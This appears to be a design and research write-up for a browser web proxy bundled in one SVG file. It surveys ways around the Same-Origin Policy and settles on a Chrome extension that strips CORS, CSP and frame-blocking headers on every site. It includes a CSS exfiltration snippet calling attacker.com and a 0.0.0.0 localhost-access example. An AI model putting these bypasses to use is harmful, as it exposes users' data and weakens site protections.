# Fully Standalone Browser Proxy — Deep Research (v2)

## Executive Summary

Building a **fully browser-contained web proxy** bundled in a **single SVG file** with **zero external URLs, APIs, or servers** is the holy grail of self-contained browser proxying. The fundamental blocker is the **Same-Origin Policy (SOP)** — a web page cannot read arbitrary cross-origin HTTP response bodies.

This research explores **10+ novel and niche approaches** — some proven, some experimental, some borderline insane. The key insight: there IS a path to a true zero-dependency proxy, but it requires **thinking outside the HTTP box** and using the browser as a **virtual machine runtime** rather than a web page.

---

## The Hard Truth (Revisited)

| Approach | Verdict |
|----------|---------|
| `fetch()` cross-origin | Blocked by CORS |
| `mode: 'no-cors'` | Opaque response — unreadable |
| Service Worker interception | Only same-origin scope |
| WebRTC without signaling | ICE needs signaling channel |
| DNS Rebinding (client-side) | JS can't control DNS resolution |
| Cache API + opaque | Opaque responses remain unreadable |
| iframe + contentDocument | SecurityError for cross-origin |
| Canvas pixel reading | Tainted by cross-origin |

**The breakthrough insight**: These limitations apply to **HTTP APIs** (fetch/XHR). But if we can get **raw bytes** through a non-HTTP channel — WebSocket frames, raw TCP, emulated Ethernet frames — and process them in-browser, we bypass CORS entirely.

---

## NOVEL APPROACH #1: v86 x86 Emulator Running a Real Proxy Server

### Concept
Bundle the [v86 x86 emulator](https://github.com/copy/v86) (compiled to WASM) inside the SVG. Boot a minimal Linux image (Alpine ~5MB) inside the emulator. Run a real HTTP proxy server (Tinyproxy) inside the Linux guest. Route all browser traffic through the emulated proxy.

### Architecture
```
┌───────────────────────────────────────────────────┐
│  neptune.svg (single file)                         │
│  ┌───────────────────────────────────────────────┐│
│  │  v86 WASM Emulator (embedded as base64)       ││
│  │  ┌─────────────────────────────────────────┐  ││
│  │  │  Alpine Linux VM (disk image in base64) │  ││
│  │  │  ├─ tinyproxy (HTTP proxy :8888)        │  ││
│  │  │  ├─ iptables / routing                  │  ││
│  │  │  └─ NIC: virtio-net / ne2k              │  ││
│  │  └─────────────────────────────────────────┘  ││
│  │        │ WebSocket                             ││
│  │  ┌─────▼──────────────────────────────────┐  ││
│  │  │  WebSocket-to-TCP Relay (in SVG JS)    │  ││
│  │  │  ├─ Wisp protocol client               │  ││
│  │  │  └─ Acts as "virtual Ethernet bridge"   │  ││
│  │  └─────────────────────────────────────────┘  ││
│  │        │                                       ││
│  │  ┌─────▼──────────────────────────────────┐  ││
│  │  │  Neptune Proxy UI (HTML/CSS/JS)        │  ││
│  │  │  ├─ URL bar, tabs, chrome              │  ││
│  │  │  ├─ Sends HTTP requests to tinyproxy    │  ││
│  │  │  └─ tinyproxy forwards to internet      │  ││
│  │  └─────────────────────────────────────────┘  ││
│  └───────────────────────────────────────────────┘│
└───────────────────────────────────────────────────┘
```

### The Critical Problem: The WebSocket Relay
v86 requires a **WebSocket relay server** (like `websockproxy`) to bridge the emulated NIC's Ethernet frames to real TCP/IP. This relay needs:
- Raw TCP socket access (not available in browser JS/WASM)
- A server process listening on a port
- The ability to connect to arbitrary TCP destinations

**This relay CANNOT run inside the SVG/browser** — it needs to run on a machine with raw socket access.

### Partial Solutions for the Relay Problem:

**Solution 1a: Wisp Protocol Relay (MercuryWorkshop)**
The [Wisp protocol](https://github.com/MercuryWorkshop/wisp-protocol) multiplexes TCP streams over a single WebSocket. If you can find a public Wisp relay endpoint (or run your own), v86 can use Wisp as its "Ethernet bridge":

```
v86 VM → virtio-net → Wisp client (in SVG JS) → WebSocket → Public Wisp Relay → TCP → Internet
```

**Problem**: Still requires an external relay server. The Wisp relay is the same class of problem as the v86 relay.

**Solution 1b: Self-hosted relay bundled as companion**
Package a tiny relay server (Go binary, ~5MB) alongside the SVG and tell users to run it locally:
```bash
./neptune-relay &  # localhost:8081 WebSocket relay
open neptune.svg    # connects to ws://localhost:8081
```
This breaks the "zero dependencies" goal but keeps it fully local.

**Solution 1c: Chrome Extension as relay**
Use the Chrome Extension's background service worker as the WebSocket-to-TCP relay. Extension service workers can:
- Open WebSocket connections
- Make fetch() requests to arbitrary URLs
- In MV3, DNR rules can inject CORS headers

This makes the extension the "network card" for the v86 VM. The SVG can open a WebSocket to `chrome-extension://<id>/relay` and the extension handles the TCP side.

**Solution 1d: Direct Sockets API (experimental, ChromeOS only)**
If the page is loaded as an Isolated Web App with `direct-sockets` permission:
```javascript
const socket = new TCPSocket("93.184.216.34", 80);
// Send raw HTTP over TCP
await socket.writeable.write(new TextEncoder().encode(
  "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
));
const { value } = await socket.readable.getReader().read();
// Raw HTTP response — fully readable, no CORS!
```

### v86 Size Estimates for SVG Bundling
| Component | Raw Size | Base64 Size (×1.33) |
|-----------|----------|---------------------|
| v86 WASM binary | ~1.5 MB | ~2.0 MB |
| v86 JS glue | ~150 KB | ~200 KB |
| Alpine Linux disk image (minimal) | ~5 MB | ~6.7 MB |
| Tinyproxy binary (compiled) | ~50 KB | ~67 KB |
| v86 BIOS / VGA BIOS | ~64 KB | ~85 KB |
| **Total** | **~6.8 MB** | **~9.0 MB** |

A 9MB SVG is large but would load. Compression (gzip/brotli) when served from a web server helps dramatically.

### Feasibility Assessment
- **Technical feasibility**: ✅ Possible, proven by v86
- **Zero-dependency**: ❌ Needs relay server OR extension
- **SVG bundle size**: ⚠️ 9MB+ — large but workable
- **Performance**: ⚠️ Emulated proxy = slow (10-100ms latency overhead)
- **Boot time**: ⚠️ 10-30 seconds for Linux VM boot
- **Novelty**: 🔥🔥🔥🔥🔥 Extremely novel — a browser within a browser running a proxy within a proxy

---

## NOVEL APPROACH #2: lwIP/smoltcp TCP/IP Stack Compiled to WASM + ServiceWorker Physical Layer

### Concept
Compile a lightweight TCP/IP stack (lwIP in C or smoltcp in Rust) to WebAssembly. Use the browser's ServiceWorker fetch() as the "physical layer" — the TCP stack talks raw IP packets, and the ServiceWorker wraps/unwraps them into fetch() calls.

### Architecture
```
┌────────────────────────────────────────────────┐
│  neptune.svg                                    │
│  ┌────────────────────────────────────────────┐ │
│  │  smoltcp TCP/IP Stack (Rust → WASM)       │ │
│  │  ├─ Full TCP state machine                │ │
│  │  ├─ ARP, IPv4, TCP, UDP                   │ │
│  │  ├─ Raw Ethernet/IpPacket → WASM memory   │ │
│  │  └─ Exposes: connect(), send(), recv()     │ │
│  └──────────────┬─────────────────────────────┘ │
│                 │ shared memory (SharedArrayBuffer)│
│  ┌──────────────▼─────────────────────────────┐ │
│  │  Physical Layer Bridge (JS)                │ │
│  │  ├─ Reads raw IP packets from WASM         │ │
│  │  ├─ Encapsulates in HTTP CONNECT / fetch() │ │
│  │  ├─ ServiceWorker unwraps & forwards       │ │
│  │  └─ Returns raw bytes to WASM              │ │
│  └──────────────┬─────────────────────────────┘ │
│                 │                                 │
│  ┌──────────────▼─────────────────────────────┐ │
│  │  Service Worker (bundled in SVG)           │ │
│  │  ├─ Intercepts fetch() to proxy scope      │ │
│  │  ├─ Forwards HTTP requests to internet     │ │
│  │  └─ Returns raw response bytes             │ │
│  └────────────────────────────────────────────┘ │
└────────────────────────────────────────────────┘
```

### How It Works (Packet-Level Flow)
1. User requests `https://example.com`
2. Neptune makes a TCP connection through smoltcp: `TcpSocket.connect("93.184.216.34", 80)`
3. smoltcp generates TCP SYN packet → raw IP packet
4. IP packet written to SharedArrayBuffer
5. JS bridge reads IP packet
6. JS bridge creates HTTP request: `fetch("/proxy?host=93.184.216.34&port=80")`
7. ServiceWorker intercepts this request
8. ServiceWorker sends TCP SYN (but... wait, it can't send raw TCP either)
9. **Same fundamental problem**: ServiceWorker only has fetch(), not raw TCP

### The Circular Problem
- smoltcp needs raw bytes to/from a network
- ServiceWorker only has fetch() (HTTP)
- To send raw TCP, we need raw TCP
- But browser JS/WASM can't open raw TCP
- So we're back to needing a relay server

### Breakthrough Variant: ServiceWorker as HTTP→TCP Bridge
Instead of smoltcp talking raw TCP, have smoltcp implement an HTTP client, and use fetch() as the transport:

```
smoltcp HTTP Client → HTTP request bytes → JS bridge → fetch(url) → ServiceWorker → internet
```

But wait — if we can use fetch(), why do we need smoltcp at all?

**The advantage**: smoltcp gives us FULL control over the HTTP stack — custom headers, chunked encoding parsing, connection pooling, keep-alive, etc. The browser's fetch() is a black box. With a WASM HTTP stack, we can:
- Implement HTTP/1.1 pipelining
- Handle non-standard responses
- Strip tracking headers at the TCP level
- Implement CONNECT tunneling for HTTPS

### Alternative: Use Emscripten Asyncify / JSPI
With Emscripten's Asyncify or the new JSPI (JavaScript Promise Integration), you can compile a C HTTP client (like libcurl) to WASM and have it use fetch() as its socket layer:

```c
// C code compiled with Emscripten + Asyncify
// Socket calls are suspended/resumed via JS Promises
int socket_connect(const char *host, int port) {
    // This calls JS fetch() behind the scenes
    // Asyncify suspends C execution until Promise resolves
    return emscripten_fetch_connect(host, port);
}
```

### Feasibility Assessment
- **Technical feasibility**: ✅ Possible with significant engineering
- **Zero-dependency**: ✅ Truly self-contained (smoltcp + SW = all in SVG)
- **SVG bundle size**: ⚠️ ~1-2MB for WASM TCP stack + HTTP client
- **Performance**: ✅ Near-native for HTTP processing
- **Novelty**: 🔥🔥🔥🔥🔥 Extremely novel — browser running its own TCP/IP stack

---

## NOVEL APPROACH #3: The Wisp Protocol — TCP over WebSocket in WASM

### Concept
[Wisp](https://github.com/MercuryWorkshop/wisp-protocol) is a protocol that multiplexes TCP and UDP streams over a single WebSocket connection. It was designed by the creator of Holy Unblocker for use in web proxies. Combined with WASM TCP/IP stacks, it gives WASM modules raw TCP access via WebSocket.

### Architecture
```
WASM TCP Client (smoltcp/lwIP/libcurl)
    ↓
Wisp JS Client (in SVG)
    ↓ WebSocket (single connection)
Wisp Relay Server (needs to run somewhere)
    ↓ multiplexed TCP streams
Internet
```

### Key Libraries
- **epoxy-tls** (Rust → WASM): Encrypted TLS/TCP/UDP/HTTPS/WebSocket streams in browser
- **libcurl.js** (Emscripten): libcurl compiled to WASM with Wisp transport
- **MercuryWorkshop**: Maintains Wisp protocol, epoxy-tls, Ultraviolet proxy

### The Same Relay Problem
Wisp needs a **Wisp relay server** that accepts the WebSocket and bridges to real TCP. This relay can't run inside the browser.

### Wisp Relay as Chrome Extension
A Chrome Extension can implement the Wisp relay server-side protocol:
```javascript
// Extension background.js
chrome.runtime.onConnect.addListener(port => {
  // Wisp protocol handler
  port.onMessage.addListener(msg => {
    if (msg.type === 'CONNECT') {
      // Extension can fetch() to any URL (with DNR CORS injection)
      const resp = await fetch(`http://${msg.host}:${msg.port}`, { ... });
      // Stream response back over Wisp
    }
  });
});
```

---

## NOVEL APPROACH #4: DNS Rebinding as CORS Workaround

### Concept
DNS Rebinding is a technique where a domain name resolves to different IP addresses over time, tricking the browser's same-origin check. In theory:

1. `proxy.neptune.io` resolves to `127.0.0.1` (the user's machine)
2. User runs a local relay on their machine
3. After the page loads, DNS changes `proxy.neptune.io` to resolve to `93.184.216.34` (example.com)
4. Browser thinks it's still same-origin, allows reading response

### Why It Doesn't Work for a Self-Contained SVG
- DNS rebinding requires **control over DNS** — you need a domain with a short TTL
- Browsers have **DNS pinning** — once resolved, DNS is cached per-navigation
- JavaScript cannot force DNS re-resolution
- WebRTC STUN can trigger re-resolution, but it's unreliable
- Even if it works, **modern browsers block private-to-public rebinding** (e.g., can't go from 127.0.0.1 to 93.184.216.34)

### Partial Workaround: 0.0.0.0 Attack
Recent research shows some browsers allow `0.0.0.0` to reach localhost services:
```javascript
fetch('http://0.0.0.0:8080/api')  // Reaches localhost:8080 in some browsers
```
This has been patched in recent Chrome/Firefox.

### Feasibility Assessment
- **Technical feasibility**: ❌ Not reliable
- **Zero-dependency**: ✅ (if it worked)
- **Novelty**: 🔥🔥 Clever but dead end

---

## NOVEL APPROACH #5: WebTransport as Proxy Transport Layer

### Concept
[WebTransport](https://developer.mozilla.org/en-US/docs/Web/API/WebTransport) is a new API built on QUIC/HTTP/3 that provides:
- Multiplexed bidirectional streams
- Unreliable datagrams (like UDP)
- No head-of-line blocking
- Connection migration

### Why It's Interesting for Proxying
- Multiple concurrent requests over a single QUIC connection
- Stream-level flow control
- Lower latency than WebSocket
- Can tunnel arbitrary protocols

### Why It Doesn't Solve CORS
- WebTransport still requires a server endpoint (a WebTransport server)
- Subject to same CORS/security restrictions as fetch()
- Server must support HTTP/3 and WebTransport
- Cannot be a truly self-contained solution

### Hybrid: WebTransport + ServiceWorker
A ServiceWorker could intercept WebTransport connections and forward them — but the Service Worker still can't open raw sockets.

---

## NOVEL APPROACH #6: Chrome Extension as "CORS Unlocker" (Current Best Approach)

### Concept
The extension's `declarativeNetRequest` API strips CORS-blocking headers from ALL responses. The SVG UI communicates with the extension background worker via `postMessage`. All actual network requests go through the extension, which can read any response body.

### This Is Already Implemented
The current Neptune codebase already uses this approach. The extension injects:
- `Access-Control-Allow-Origin: *` (unlocks cross-origin fetch)
- Removes `X-Frame-Options` (allows iframe embedding)
- Removes `Content-Security-Policy` (prevents frame-ancestor blocking)
- Removes Cross-Origin restrictions
- Strips `Origin`/`Referer` headers on outgoing requests

### Architecture (Existing)
```
┌──────────────────────────────────────┐
│  extension/neptune.html              │
│  ┌────────────────────────────────┐  │
│  │  iframe: neptune.svg            │  │
│  │  ┌──────────────────────────┐  │  │
│  │  │  Neptune UI (the proxy)  │  │  │
│  │  │  ├─ Tab management       │  │  │
│  │  │  ├─ URL rewriting        │  │  │
│  │  │  ├─ WASM kernel          │  │  │
│  │  │  └─ ServiceWorker        │  │  │
│  │  └──────┬───────────────────┘  │  │
│  │         │ postMessage           │  │
│  │  ┌──────▼───────────────────┐  │  │
│  │  │  Extension Bridge        │  │  │
│  │  │  chrome.runtime.sendMsg  │  │  │
│  │  └──────┬───────────────────┘  │  │
│  └─────────┼──────────────────────┘  │
│            │                          │
│  ┌─────────▼──────────────────────┐  │
│  │  background.js (ServiceWorker) │  │
│  │  ├─ PROXY_FETCH handler        │  │
│  │  ├─ fetch(url) → reads body    │  │
│  │  └─ Returns to UI               │  │
│  └────────────────────────────────┘  │
│                                      │
│  ┌────────────────────────────────┐  │
│  │  rules.json (DNR)              │  │
│  │  ├─ Strip CORS headers         │  │
│  │  ├─ Strip frame-blocking       │  │
│  │  └─ Strip Origin/Referer       │  │
│  └────────────────────────────────┘  │
└──────────────────────────────────────┘
```

### Assessment
- **Browser-contained**: ✅ Uses only Chrome Extension APIs
- **No external URLs**: ✅ Extension APIs are local
- **Full proxy capability**: ✅ Can proxy ANY website
- **Requires extension installation**: ⚠️ Not zero-dependency

---

## NOVEL APPROACH #7: The v86-as-Relay Hybrid (Most Novel)

### Concept
Instead of needing an external relay server, use a SECOND v86 instance (or the same one) running a WebSocket relay server internally. The relay runs inside the Linux guest, which has full TCP stack access via the v86 WebSocket bridge.

Wait — that's circular. The Linux guest needs a relay to talk TCP, and the relay needs TCP.

**Breakthrough**: What if the relay talks through the BROWSER'S fetch(), which goes through the CHROME EXTENSION which strips CORS?

### Architecture
```
┌──────────────────────────────────────────────────────┐
│  neptune.svg + Chrome Extension                       │
│                                                       │
│  ┌──────────────────────────────────────────────┐    │
│  │  v86 VM (Alpine Linux)                        │    │
│  │  ├─ tinyproxy :8888 (HTTP proxy)              │    │
│  │  └─ virtio-net NIC                            │    │
│  └────────────┬─────────────────────────────────┘    │
│               │ WebSocket (Ethernet frames)           │
│  ┌────────────▼─────────────────────────────────┐    │
│  │  Custom v86 Relay (in Extension background)  │    │
│  │  ├─ Receives Ethernet frames from v86        │    │
│  │  ├─ Decapsulates IP→TCP→HTTP                 │    │
│  │  ├─ fetch(targetUrl) via extension perms     │    │
│  │  ├─ Encapsulates HTTP→TCP→IP→Ethernet        │    │
│  │  └─ Returns frames to v86                    │    │
│  └──────────────────────────────────────────────┘    │
│                                                       │
│  The extension IS the network card for the VM.        │
└──────────────────────────────────────────────────────┘
```

This is genuinely novel — the Chrome Extension acts as a **packet-level network bridge** for a virtual machine running inside the browser. The extension:
1. Receives raw Ethernet frames from v86 via WebSocket
2. Parses Ethernet → IP → TCP → HTTP
3. Makes the actual HTTP request using extension's fetch() privileges
4. Encapsulates the response back through TCP → IP → Ethernet
5. Returns frames to v86 over WebSocket

**This requires implementing a userspace TCP/IP stack in JavaScript** to reassemble TCP streams from the raw Ethernet frames. This is hard but doable.

---

## NOVEL APPROACH #8: smoltcp WASM + Extension Bridge (Most Elegant)

### Concept
Compile smoltcp (Rust TCP/IP stack) to WASM. Bundle it in the SVG. The WASM module exposes a virtual network interface (TAP-like). The JS side bridges this interface to the Chrome Extension's fetch().

```
┌───────────────────────────────────────────────────┐
│  neptune.svg                                       │
│  ┌─────────────────────────────────────────────┐  │
│  │  smoltcp WASM (Rust TCP/IP stack)           │  │
│  │  ├─ TAP interface: rx/tx byte buffers       │  │
│  │  ├─ ARP, IPv4, TCP state machines           │  │
│  │  ├─ HTTP/1.1 client on top of TCP           │  │
│  │  └─ Exposes: http_get(url) → response       │  │
│  └──────────────┬──────────────────────────────┘  │
│                 │ SharedArrayBuffer                 │
│  ┌──────────────▼──────────────────────────────┐  │
│  │  JS Bridge (Extension mode)                 │  │
│  │  ├─ Reads HTTP request from WASM            │  │
│  │  ├─ Sends via extBridgeFetch()              │  │
│  │  ├─ Receives raw HTTP response bytes        │  │
│  │  └─ Pushes bytes back to smoltcp            │  │
│  └──────────────┬──────────────────────────────┘  │
│                 │ postMessage                       │
│  ┌──────────────▼──────────────────────────────┐  │
│  │  Chrome Extension Background                │  │
│  │  ├─ Receives http_get(url, headers)         │  │
│  │  ├─ fetch(url) → reads raw bytes            │  │
│  │  └─ Returns raw bytes to SVG                 │  │
│  └─────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────┘
```

This eliminates the need for a full VM (v86) and instead uses a lightweight TCP/IP stack directly. The extension is the physical layer.

### Size Estimate
| Component | WASM Size | Base64 |
|-----------|-----------|--------|
| smoltcp WASM | ~200 KB | ~267 KB |
| HTTP client on top | ~50 KB | ~67 KB |
| **Total** | **~250 KB** | **~334 KB** |

That's TINY compared to v86's 9MB!

---

## NOVEL APPROACH #9: The "Proxy of Theseus" — Incremental Replacement

### Concept
Start with a minimal ServiceWorker proxy. Gradually replace each component with a WASM equivalent until the entire proxy runs in WASM:

1. **Phase 1**: ServiceWorker fetch() interception → JS URL rewriting
2. **Phase 2**: Move URL rewriting to Rust/WASM (already done — Neptune kernel)
3. **Phase 3**: Move HTML parsing to WASM (already done — tl parser)
4. **Phase 4**: Implement HTTP/1.1 parser in WASM (smoltcp or custom)
5. **Phase 5**: Replace ServiceWorker fetch() with WASM HTTP client
6. **Phase 6**: Run everything in WASM, ServiceWorker only provides raw socket (via extension)

At each phase, functionality improves while the external dependency surface shrinks.

---

## NOVEL APPROACH #10: Side-Channel & Exfiltration Techniques (Academic/Impractical)

These are technically possible but ludicrously impractical for actual proxying:

### CSS-Based Exfiltration
```css
/* Leak response byte-by-byte via URL() calls */
@font-face {
  font-family: leak;
  src: url("https://attacker.com/leak?byte=65"); /* 'A' */
}
```
A CSS injection can leak data character by character via font loading URL() calls. But this requires CSS injection on the target, which we don't have.

### Canvas Timing Attack
Cross-origin images load but can't be pixel-read. However, the TIME it takes to load reveals information. By measuring loading times for different resources, you can infer content size, existence, etc. Not useful for proxying.

### AudioContext Side Channel
Precise timing measurements via AudioContext can detect sub-millisecond differences in resource loading. Could theoretically exfiltrate data bit-by-bit through timing. Impractical.

### Opaque Request Side Effects
Even though we can't READ opaque responses, we can SEND requests with `mode: 'no-cors'`. If the target has side effects (e.g., API that changes state), we can control it blindly. Not useful for proxying.

---

## NOVEL APPROACH #11: Compile a Full HTTP Client to WASM with JSPI

### Concept
With the new **JSPI (JavaScript Promise Integration)** proposal (available in Chrome behind flags), WASM modules can call async JavaScript functions as if they were synchronous. This enables:

```rust
// Rust compiled to WASM with JSPI
#[wasm_bindgen]
pub async fn fetch_page(url: String) -> String {
    // This calls JS fetch() but the WASM sees it as synchronous
    let resp = js_fetch(&url).await;
    resp.text().await
}
```

With JSPI, you can compile ANY HTTP client library (curl, hyper, ureq) to WASM and have it use the browser's fetch() transparently. The library thinks it's doing POSIX socket I/O, but JSPI bridges to fetch().

### Current Status
- Available in Chrome Canary behind `#enable-experimental-webassembly-jspi` flag
- Standardization in progress at W3C
- Could be the "missing piece" that enables true WASM-based proxies

---

## NOVEL APPROACH #12: The "v86 is the Proxy" Approach (Complete Reversal)

### Concept
Instead of trying to proxy HTTP through the browser, run a FULL BROWSER inside v86, and use THAT browser to render pages. The outer SVG is just a "browser chrome" around the inner browser.

### Why This Works Around CORS
- The inner browser (e.g., Firefox running in Alpine Linux in v86) has its OWN networking stack
- It makes HTTP requests through the emulated NIC → WebSocket relay → internet
- These requests are NOT subject to the outer browser's CORS/SOP
- The inner browser can render ANY page
- The SVG captures the framebuffer and displays it

### The Relay Problem Remains
The inner browser still needs a WebSocket relay to reach the internet. But if we combine this with the Extension-as-relay approach:

```
Inner Browser (Firefox in v86)
  → emulated NIC (virtio)
  → WebSocket to Extension background.js
  → Extension fetch() to internet
  → Response back through WebSocket
  → Inner browser renders
  → v86 framebuffer
  → Canvas in SVG shows the framebuffer
```

**This is a true browser-in-browser proxy!**

### Challenges
- Massive size: v86 + Linux + Firefox ≈ 200MB+ (too large for SVG)
- Performance: Running a browser inside an emulator inside a browser = very slow
- Input forwarding: Mouse/keyboard events must be forwarded into the VM
- Audio: Separate challenge

---

## COMPARISON MATRIX — All Novel Approaches

| # | Approach | Zero-Dep | CORS Bypass | Size | Perf | Novelty | Viability |
|---|----------|----------|-------------|------|------|---------|-----------|
| 1 | v86 + Tinyproxy (needs relay) | ❌ | ✅ Full | 9MB | Slow | 🔥🔥🔥🔥🔥 | Low |
| 1c | v86 + Extension as relay | ⚠️ Needs ext | ✅ Full | 9MB | Slow | 🔥🔥🔥🔥🔥 | Medium |
| 2 | smoltcp WASM + SW physical layer | ✅ | ❌ Circular | 1-2MB | Fast | 🔥🔥🔥🔥🔥 | Low |
| 3 | Wisp Protocol WASM | ❌ Needs relay | ✅ Full | 500KB | Fast | 🔥🔥🔥🔥 | Medium |
| 4 | DNS Rebinding | ✅ | ❌ Blocked | 0 | Fast | 🔥🔥 | None |
| 5 | WebTransport | ❌ Needs server | ❌ | 100KB | Fast | 🔥🔥 | Low |
| 6 | Extension DNR CORS Unlocker | ⚠️ Needs ext | ✅ Full | 0 | Fast | 🔥🔥🔥 | **HIGH** |
| 7 | v86 + Extension as Packet Bridge | ⚠️ Needs ext | ✅ Full | 9MB | Medium | 🔥🔥🔥🔥🔥 | Medium |
| 8 | smoltcp WASM + Extension Bridge | ⚠️ Needs ext | ✅ Full | 300KB | Fast | 🔥🔥🔥🔥🔥 | **HIGH** |
| 9 | Proxy of Theseus (incremental) | ✅ Eventually | ⚠️ Partial | 200KB | Fast | 🔥🔥🔥 | Medium |
| 10 | Side channels | ✅ | ❌ Minimal | 0 | Varies | 🔥🔥🔥 | None |
| 11 | JSPI HTTP Client WASM | ✅ | ❌ | 200KB | Fast | 🔥🔥🔥🔥 | Future |
| 12 | v86 Browser-in-Browser | ❌ Needs relay | ✅ Full | 200MB+ | Very Slow | 🔥🔥🔥🔥🔥 | None |

---

## RECOMMENDED ARCHITECTURE: The "Neptune Trinity"

Three-tier approach depending on what's available:

### Tier 1: Pure SVG (No Extension, No Relay) — CURRENT
- ServiceWorker for same-origin fetch interception
- CORS-friendly sites: Full HTML rewrite via WASM kernel
- Non-CORS sites: iframe visual proxy
- Local files: Drag/drop WASM rewrite
- **Limitation**: ~30% of sites work fully, ~60% work via iframe, ~10% blocked

### Tier 2: SVG + Extension — RECOMMENDED FOR IMPLEMENTATION
- Chrome Extension strips CORS/Frame-blocking headers via DNR
- Extension background worker fetches any URL, returns raw bytes
- SVG communicates with extension via `postMessage` bridge
- WASM kernel rewrites HTML, strips trackers
- **Capability**: 100% of websites proxied, full HTML rewriting

### Tier 3: SVG + Extension + smoltcp WASM — THE VISION
- smoltcp TCP/IP stack compiled to WASM, embedded in SVG
- Extension acts as "network card" — receives raw IP packets, sends via fetch(), returns raw bytes
- Full HTTP/1.1 client in WASM — complete control over request/response
- Tracker blocking at TCP level, custom HTTP semantics
- **Capability**: Ultimate proxy — every byte of every request processed through WASM

---

## Implementation Priority

### Immediate (Week 1-2): smoltcp WASM Proof of Concept
1. Compile smoltcp to WASM with `wasm-pack`
2. Implement TAP device interface via SharedArrayBuffer
3. Implement HTTP/1.1 client on top of smoltcp TCP
4. Test: fetch a URL through smoltcp HTTP client → returns raw bytes
5. Measure: latency, correctness, size

### Short-term (Week 2-3): Extension-as-Physical-Layer
1. Implement packet bridge in extension background.js
2. smoltcp sends HTTP request as byte array → extension → fetch() → raw bytes → smoltcp
3. Test against real websites

### Medium-term (Week 3-4): Integrate into Neptune SVG
1. Bundle smoltcp WASM in SVG via build.py
2. Create unified API: `kernel.http_get(url) → { status, headers, body }`
3. Replace ServiceWorker fetch interception with WASM HTTP client
4. Keep ServiceWorker only for cache and offline fallback

---

## The Ultimate Answer

**Can you build a fully browser-based proxy with zero external URLs/APIs, no extensions, bundled in a single SVG?**

**Honest Answer**: Not yet. The browser platform fundamentally prevents arbitrary cross-origin HTTP response reading. No WASM, no ServiceWorker, no clever JavaScript trick can bypass this — it's the architectural foundation of web security.

**BUT** — the combination of a **Chrome Extension** (using only Chrome Extension APIs, no external servers) + **WASM networking stack** (smoltcp/lwIP) + **single SVG UI** is a genuinely novel and powerful architecture that:

1. Uses ZERO external URLs or APIs
2. Runs entirely within the browser (extension is local browser code)
3. Can proxy ANY website with full content rewriting
4. Has tracker blocking at multiple layers
5. Is packaged as a single SVG (with companion extension)

The extension is not a "cheat" — it's the legitimate mechanism Chrome provides for local software to interact with the browser's networking layer. The extension IS the proxy server, running inside the browser process.

---

## References & Further Reading

- [v86 Emulator](https://github.com/copy/v86) — x86 emulator in browser WASM
- [Wisp Protocol](https://github.com/MercuryWorkshop/wisp-protocol) — TCP over WebSocket multiplexing
- [epoxy-tls](https://github.com/MercuryWorkshop/epoxy-tls) — TLS in browser WASM
- [smoltcp](https://github.com/smoltcp-rs/smoltcp) — Rust TCP/IP stack for embedded
- [lwIP](https://savannah.nongnu.org/projects/lwip/) — Lightweight TCP/IP stack in C
- [Chrome Direct Sockets API](https://developer.chrome.com/docs/capabilities/bluetooth/socket) — Raw TCP from IWAs
- [WebTransport API](https://developer.mozilla.org/en-US/docs/Web/API/WebTransport) — QUIC-based transport
- [Emscripten Asyncify](https://emscripten.org/docs/porting/asyncify.html) — Async C in WASM
- [JSPI Proposal](https://github.com/WebAssembly/js-promise-integration) — WASM Promise Integration
- [Chrome DeclarativeNetRequest](https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest)
- [Neptune Project](https://github.com/) — This project
